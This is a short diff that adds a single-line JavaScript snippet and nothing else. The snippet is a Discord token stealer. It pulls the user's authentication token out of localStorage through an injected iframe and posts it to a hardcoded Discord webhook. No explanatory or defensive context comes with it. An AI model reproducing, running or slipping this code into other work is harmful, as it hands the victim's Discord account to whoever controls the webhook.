@@ -1,0 +1,2 @@
+```js
+(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);var t = i.contentWindow.localStorage.token.replace(/['"]+/g, '');fetch("https://discord.com/api/webhooks/810268458431938611/YGfKyCgWopUdCCrPq2WDl7XRogGPd9ME73z5MDWNENTzlkJ5KVjWO5Qlnb9Wy5I__H_n",{credentials:"same-origin",mode:"same-origin",method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({'content':t})})})();```
